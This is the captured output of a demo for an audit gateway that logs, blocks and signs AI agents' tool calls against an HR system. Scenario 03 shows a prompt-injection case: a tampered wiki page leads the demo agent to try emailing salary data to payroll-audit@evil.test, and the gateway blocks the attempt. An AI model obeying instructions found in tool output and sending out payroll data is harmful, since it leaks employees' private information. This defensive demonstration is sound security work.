# Sample run: `./run-demo.sh --deep-dive`

Captured 2026-10-13 against the code in this directory. Hashes, uids, epochs and ledger positions differ on every run; everything else should match.

```text
═══════════════════════════════════════════════════════════════
  Praxis audit demo: every agent tool call, provably on record
═══════════════════════════════════════════════════════════════

Starting services
  ✓ ARE ledger
  ✓ Keycloak
  ✓ HR MCP server

Building and starting the Praxis gateway
  ✓ gateway on 127.0.0.1:8090 (records: out/gateway.stderr)

━━━ 01  HR reads compensation: allowed, with evidence ━━━
  Who     Bob, HR business partner, through the HR copilot agent
  Policy  only the HR role may read compensation; the call goes out on a scoped workday-api token
  Risk    an allow nobody can prove later is as bad as no control at all

Bob's agent asks for Jane Smith's compensation
    ✓ get_compensation(EMP-001234)  {"employee_id":"EMP-001234","name":"Jane Smith","salary":125000,"bonus":15000,"department"…

OCSF records the gateway wrote for that one call
    seq 0   -                 identity        Allowed (modified)  
    seq 1   -                 token exchange  Allowed (modified)  
    seq 2   get_compensation  authorize       Allowed (modified)  
    seq 3   -                 response        Allowed (modified)  
  the authorize record, abridged:
    {"class_uid":6003,"activity_name":"Invoke Tool","disposition":"Allowed","actor":{"user":{"uid":"ce0a32ba-7d30-4e4e-b29a-bd446c203501","groups":["hr"]},"roles":["hr"]},"tool":{"name":"get_compensation","uid":"1","namespace":null},"stream":{"epoch":1791910912611204788,"stream_id":"praxis-gw-1:decision","stream_seq":2,"emission_seq":4},"prev":"ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000001","signed_by":"praxis-audit-demo-1"}

Shipping them to the ARE ledger
    [107] cpex.decision        agent=unknown              seq=0
    [108] cpex.decision        agent=unknown              seq=1
    [109] cpex.decision        agent=unknown              seq=2
    [110] cpex.decision        agent=unknown              seq=3
    Written: 4  Errors: 0  Parse errors: 0  Skipped: 0  Gaps: 0
    Receipt for     ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000002
    Ledger valid    YES
    Chain position  109
    Entry hash      6315eea2aa0d4ec8df98a60e194cb273cb16f87e1800cfd739ba4ebae3243945
    Previous hash   ad1cc53393a9fd881eb8d342901bf1d44804d6b0c007e3d420d7c828065762ea
    Signed by       praxis-audit-demo-1 (71-byte gateway signature kept with the entry)
    Record verdict  Allowed

  What the auditor gets  an OCSF API Activity event per ruling (identity, token exchange, authorize,
         response), each hash-chained to the last and DSSE-signed by the gateway, plus a ledger
         receipt for each that verifies without trusting the gateway.

━━━ 02  Engineer reads compensation: denied before the HR system sees it ━━━
  Who     Alice, principal engineer, through the same HR copilot agent
  Policy  require(role.hr) on get_compensation
  Risk    an over-broad agent leaking salary data to people outside HR

Alice's agent asks for Jane Smith's compensation
    ✗ get_compensation(EMP-001234): DENIED  access denied  [routes.tool:get_compensation.pre_invocation[0]]

OCSF records
    seq 4   -                 identity        Allowed (modified)  
    seq 5   get_compensation  authorize       Blocked             routes.tool:get_compensation.pre_invocation[0]
  the deny record names the rule and the principal:
    {"action":"Denied","disposition":"Blocked","status_code":"routes.tool:get_compensation.pre_invocation[0]","status_detail":"access denied","actor":{"user":{"uid":"d09e80d0-2634-4ca3-affa-535ff5271472","groups":["engineering"]},"roles":["engineer"]}}

Shipping them to the ARE ledger
    [111] cpex.decision        agent=unknown              seq=4
    [112] cpex.decision        agent=unknown              seq=5
    Written: 2  Errors: 0  Parse errors: 0  Skipped: 0  Gaps: 0
    Receipt for     ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000005
    Ledger valid    YES
    Chain position  112
    Entry hash      695df927745b759468fb91800cc95c33594d944c38df1896eb639c8ca84541b6
    Previous hash   0b1cae2097e4d2b6b58586de227b2c6d274dc7b90f3aa95f3d7675f9c338372f
    Signed by       praxis-audit-demo-1 (70-byte gateway signature kept with the entry)
    Record verdict  Blocked routes.tool:get_compensation.pre_invocation[0]

  What the auditor gets  a signed deny record naming who asked (actor), for what (tool), and which rule
         refused it (status_code points at the policy line), receipted in the ledger.

━━━ 03  Prompt injection tries to exfiltrate salary data: blocked and recorded ━━━
  Who     Bob's HR copilot agent, reading an internal wiki page someone has tampered with
  Policy  a session that has read compensation is tainted 'secret'; tainted sessions cannot send email,
          and email may only go to @corp.com
  Risk    an agent obeying instructions hidden in a document and mailing payroll data to an attacker

The agent runs Bob's task: prepare Jane Smith's Q3 compensation review
  agent user task: prepare Jane Smith's Q3 compensation review
    ✓ fetch_doc(comp-review-process)  {"doc_id":"comp-review-process","body":"# Q3 compensation review\nManagers review salary b…
    ✓ get_compensation(EMP-001234)  {"employee_id":"EMP-001234","name":"Jane Smith","salary":125000,"bonus":15000,"department"…
  agent found an instruction in tool output and is following it
    ✗ send_email(to=payroll-audit@evil.test): DENIED by gateway  external email blocked: this session accessed secret data  [session_tainted_secret]
  ✓ the HR system sent nothing: the email never left the gateway

OCSF records for the whole agent run
    seq 6   -                 identity        Allowed (modified)  
    seq 7   fetch_doc         authorize       Allowed             
    seq 8   -                 forward         Allowed             
    seq 9   -                 identity        Allowed (modified)  
    seq 10  -                 token exchange  Allowed (modified)  
    seq 11  get_compensation  authorize       Allowed (modified)  
    seq 12  -                 response        Allowed (modified)  
    seq 13  -                 identity        Allowed (modified)  
    seq 14  send_email        authorize       Blocked             session_tainted_secret
  the deny record:
    {"tool":"send_email","action":"Denied","disposition":"Blocked","status_code":"session_tainted_secret","status_detail":"external email blocked: this session accessed secret data","actor":{"user":{"uid":"ce0a32ba-7d30-4e4e-b29a-bd446c203501","groups":["hr"]},"roles":["hr"]},"session":"s03-29251","verdict":{"deny":{"code":"session_tainted_secret","reason":"external email blocked: this session accessed secret data"}}}

Shipping them to the ARE ledger
    [113] cpex.decision        agent=unknown              seq=6
    [114] cpex.decision        agent=unknown              seq=7
    [115] cpex.decision        agent=unknown              seq=8
    [116] cpex.decision        agent=unknown              seq=9
    [117] cpex.decision        agent=unknown              seq=10
    [118] cpex.decision        agent=unknown              seq=11
    [119] cpex.decision        agent=unknown              seq=12
    [120] cpex.decision        agent=unknown              seq=13
    [121] cpex.decision        agent=unknown              seq=14
    Written: 9  Errors: 0  Parse errors: 0  Skipped: 0  Gaps: 0
    Receipt for     ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000014
    Ledger valid    YES
    Chain position  121
    Entry hash      920378ead8dcebc14b3ae12c74173ac671b9e62e008bd94040a3a8a190af9a75
    Previous hash   782663b93077c775a37431b88f9526bea801b947668f51a018203e7ee377c1b4
    Signed by       praxis-audit-demo-1 (71-byte gateway signature kept with the entry)
    Record verdict  Blocked session_tainted_secret

  What the auditor gets  the full sequence (doc read, salary read, refused exfiltration) as one hash
         chain, with the refusal's reason (session_tainted_secret) inside the signed bytes. A SIEM
         ingests the OCSF as-is; the ledger receipt proves the record was not edited afterwards.

━━━ 04  SSN redacted in flight: the record proves it without repeating it ━━━
  Who     Eve, HR generalist (HR role, no view_ssn permission)
  Policy  result.ssn is redacted unless the caller holds perm.view_ssn
  Risk    PII reaching an unauthorised user, or landing in the audit log itself

Eve's agent asks for Jane Smith's record including the SSN
    ✓ get_compensation(include_ssn=true)  {"employee_id":"EMP-001234","name":"Jane Smith","salary":125000,"bonus":15000,"department"…
    ssn field the agent received: [REDACTED]

OCSF records
    seq 15  -                 identity        Allowed (modified)  
    seq 16  -                 token exchange  Allowed (modified)  
    seq 17  get_compensation  authorize       Allowed (modified)  
    seq 18  -                 response        Allowed (modified)  
    response digests: in sha256:6c97ff1eb659a97…  out sha256:360dbb10eae7f54…
  ✓ input and output digests differ: the gateway changed the response
  ✓ the SSN appears nowhere in the audit records

Shipping them to the ARE ledger
    [122] cpex.decision        agent=unknown              seq=15
    [123] cpex.decision        agent=unknown              seq=16
    [124] cpex.decision        agent=unknown              seq=17
    [125] cpex.decision        agent=unknown              seq=18
    Written: 4  Errors: 0  Parse errors: 0  Skipped: 0  Gaps: 0
    Receipt for     ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000018
    Ledger valid    YES
    Chain position  125
    Entry hash      6fc688ca6a1cf07d28d3257c72915c146ab6f9d84715298bc4484f673021b244
    Previous hash   7baba9e26f0ff4638a834a05c451027a9819df76852ec2da0e250da173ab88ee
    Signed by       praxis-audit-demo-1 (71-byte gateway signature kept with the entry)
    Record verdict  Allowed

  What the auditor gets  proof that the response was modified (allow-after-modify, differing content
         digests) without the audit trail ever holding the SSN it removed.

━━━ 05  Gateway crash and restart: a new epoch, not a gap ━━━
  Who     the operations team, after an unplanned gateway restart
  Policy  every executor boot opens a new epoch; stream_seq restarts at 0 inside it
  Risk    an auditor unable to tell a restart from deleted records

One call before the crash
    ✓ get_compensation(EMP-005678)  {"employee_id":"EMP-005678","name":"Bob Johnson","salary":145000,"bonus":25000,"department…

kill -9 the gateway, then start it again
  ✓ gateway killed
  ✓ gateway restarted

One call after the restart
    ✓ get_compensation(EMP-005678)  {"employee_id":"EMP-005678","name":"Bob Johnson","salary":145000,"bonus":25000,"department…
  last record before the crash: {"epoch":1791910912611204788,"stream_seq":22}
  last record after the restart: {"epoch":1791910915081165629,"stream_seq":3}
  genesis record of the new chain: ocsf-chain-ocsf-audit-babd12ef5d384d9caeb3f3367c48e8a0-att-000000

Shipping both sides of the restart to the ARE ledger
    [126] cpex.decision        agent=unknown              seq=19
    [127] cpex.decision        agent=unknown              seq=20
    [128] cpex.decision        agent=unknown              seq=21
    [129] cpex.decision        agent=unknown              seq=22
    NOTE: EPOCH CHANGE in praxis-gw-1:decision: 1791910912611204788 -> 1791910915081165629; stream_seq resets to 0 (expected, not a gap)
    [130] cpex.decision        agent=unknown              seq=0
    [131] cpex.decision        agent=unknown              seq=1
    [132] cpex.decision        agent=unknown              seq=2
    [133] cpex.decision        agent=unknown              seq=3
    Written: 8  Errors: 0  Parse errors: 0  Skipped: 0  Gaps: 0

  What the auditor gets  an explicit epoch boundary: the adapter reports EPOCH CHANGE and counts no gap,
         the new process starts a fresh chain at its genesis record, and the ledger's own chain
         runs straight through the restart.

━━━ 06  Tampering and loss: caught offline with the public key ━━━
  Who     an external auditor holding the NDJSON export and the gateway's public key
  Policy  AID-EMIT-1: every record is fingerprinted, chained to its predecessor and DSSE-signed
  Risk    an insider quietly rewriting a deny into an allow, or deleting the record of it

1. The untouched export (27 records)
    PASS: 27 records — 0 errors, 0 warnings (AID-EMIT-1 v1.2.0-draft (docs/specs/aid-emit-1.md))

2. Flip one deny into an allow in one record
  edited record 6
    ERROR E-FP-MISMATCH   record 6: fingerprint does not reproduce under §4 covered bytes (JCS): claimed 8fa106c3425e7c93…, computed 052c8f740b937013…
    ERROR E-SIG-VERIFY    record 6: signature does not verify over the DSSE PAE of the covered bytes (§11)
    ERROR E-CHAIN-FP      record 7: prev_event.fingerprint does not match predecessor's recomputed fingerprint (§11)
    FAIL: 27 records — 3 errors, 0 warnings (AID-EMIT-1 v1.2.0-draft (docs/specs/aid-emit-1.md))

3. Delete one record
  deleted record 12
    ERROR E-CHAIN-UID     record 12: prev_event.uid 'ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000011' != predecessor metadata.uid 'ocsf-chain-ocsf-audit-6d84c1335a1d485c91633551bd6657c4-000010' (§11)
    ERROR E-CHAIN-FP      record 12: prev_event.fingerprint does not match predecessor's recomputed fingerprint (§11)
    WARN  GAP-STREAM      record 12: stream_seq gap in (1791910912611204788, 'praxis-gw-1:decision'): expected 11, got 12 — a gap is evidence to surface, not repair (§7)
  and the ledger adapter's gap detector, over the same export (nothing written):
      WARNING: GAP in praxis-gw-1:decision: expected stream_seq 11, got 12

  What the auditor gets  a pinpointed failure for the edited record (fingerprint and signature no longer
         verify, and the next record's link breaks) and a stream_seq gap for the deleted one,
         from the export and a public key alone. No access to the gateway is needed.

━━━ Verifying everything ━━━
  AID-EMIT-1 validator (fingerprints, chain, DSSE signatures, stream density)
    PASS: 27 records — 0 errors, 0 warnings (AID-EMIT-1 v1.2.0-draft (docs/specs/aid-emit-1.md))
  ARE ledger (independent hash chain over the same records)
      All 1 chains verified. 0 tampered.

  Every ruling the gateway made, allow, deny or modify, is an OCSF event a SIEM
  ingests as-is, signed by the gateway and receipted by a ledger that does not
  have to trust it.

  Stop: tools/gateway.sh stop && docker compose down -v

```
